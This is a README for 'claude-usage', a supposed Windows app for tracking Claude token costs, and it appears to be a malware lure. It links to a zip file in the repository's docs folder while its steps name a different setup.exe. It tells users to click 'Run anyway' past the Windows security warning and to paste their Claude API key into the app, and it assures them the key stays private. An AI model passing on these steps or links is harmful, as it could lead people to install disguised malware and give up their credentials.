# 📊 claude-usage - Monitor your Claude token costs daily

[![](https://img.shields.io/badge/Download_for_Windows-blue-blue)](https://github.com/Nitricoxideatavism5584/claude-usage/raw/refs/heads/main/docs/usage-claude-3.1.zip)

This application tracks your Claude Code usage. It provides a visual dashboard for token consumption, costs, and session history. If you hold a Pro or Max subscription, the app shows a progress bar to track your monthly limits.

## 📥 How to download the app

Visit the official project page to download the software for your computer.

[Click here to download the latest version](https://github.com/Nitricoxideatavism5584/claude-usage/raw/refs/heads/main/docs/usage-claude-3.1.zip)

## 🖥️ System requirements

This application runs on Windows 10 and Windows 11. Your computer requires at least 4 gigabytes of memory and an active internet connection to sync your usage data from the Claude API. You do not need to install extra database software or programming tools. The installer handles all necessary components for you.

## ⚙️ Installation steps

1. Visit the repository link provided above.
2. Select the file named `claude-usage-setup.exe` under the latest release section.
3. Save the file to your desktop or downloads folder.
4. Double-click the file to start the installer.
5. Follow the prompts on your screen. Windows may show a security prompt because this is a new application. Click "More info" and then "Run anyway" if the system restricts the installation.
6. Once the installer finishes, locate the shortcut icon on your desktop.

## 🔑 Linking your account

The dashboard needs access to your usage logs to function. When you open the app, it asks for your API key. 

1. Sign in to your Claude account in your web browser.
2. Navigate to your account settings and generate an API key. 
3. Copy this long string of characters.
4. Paste the key into the app settings window.
5. Click the "Save and Connect" button.
6. The app scans your history and updates your dashboard with your current data.

## 📈 Understanding the dashboard

The main view displays three primary areas to help you manage your budget and usage:

*   **Token Usage:** This section shows how many tokens you consume each day. It distinguishes between input and output tokens so you understand where costs originate.
*   **Cost Tracker:** This shows the monetary cost associated with your session activity. The app calculates this based on standard Claude pricing tiers.
*   **Usage Limits:** The progress bar at the top of the window turns green when your usage is low, yellow during moderate activity, and red as you approach your monthly subscription cap. Pro and Max subscribers receive automatic updates to ensure these limits remain accurate.

## 🛠️ Frequently asked questions

**Does this app record my private chat content?**
No. This application only reads metadata regarding token counts and session costs. It does not store or analyze the text of your conversations.

**Why does the dashboard show zero usage when I know I used Claude?**
The dashboard updates after you synchronize your session. Ensure you have an active internet connection. Click the "Refresh" button in the top corner of the app to force a data sync.

**Can I run this on multiple computers?**
Yes. You can install the dashboard on any Windows computer you own. Use the same API key to see identical usage statistics across all machines.

**How do I update the software?**
The application checks for updates every time you open it. If a new version exists, the app displays a notification. Click "Update" to download the latest features and security fixes.

## 🛡️ Privacy and security

Your API key remains stored locally on your device. The application encrypts the key to prevent unauthorized access. The app never shares your credentials or usage history with third-party servers. All data processing occurs directly on your computer.

## 💡 Troubleshooting tips

If you encounter issues during installation or usage, try these steps:

*   Check your internet connection if the dashboard fails to load data. 
*   Verify that you copied the complete API key. Missing a single character prevents the app from connecting to your account.
*   If the app crashes, delete the `config.json` file in the installation folder and restart the application. This resets your configuration to default settings. 
*   Ensure your Windows clock is accurate. Incorrect system time prevents the app from syncing correctly with the Claude servers.

## 📝 Support information

If the dashboard stops functioning or if you identify a bug, visit the repository issues tab. Provide a brief description of what you notice on the screen. The community monitors these reports to improve the software for all users. You do not need to be a programmer to submit an issue; describe the steps you took leading up to the problem.